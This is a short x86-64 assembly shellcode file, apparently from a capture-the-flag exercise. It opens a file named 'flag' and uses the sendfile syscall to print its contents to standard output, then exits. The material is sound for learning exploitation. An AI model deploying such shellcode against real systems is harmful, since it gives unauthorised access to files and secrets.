.global _start
_start:
.intel_syntax noprefix
    mov rax, 2                # syscall for open
    lea rdi, [rip+filename]   # arg1 - filename
    mov rsi, 0                # arg2 - flag, 0 == O_RDONLY, 1 = 0_WRONLY, 2 = O_RDWR
    mov rdx, 0x100            # arg3 - mode, octal 0o400 = file owner read only
    syscall

    mov rsi, rax              # arg2 of sendfile = fid from open
    mov rax, 40               # syscall for sendfile
    mov rdi, 1                # arg1 of sendfile
    mov rdx, 0                # arg3 of sendfile
    mov r10, 1000             # arg4 of sendfile
    syscall

    mov rax, 60
    syscall

filename:
    .string "flag\0"
    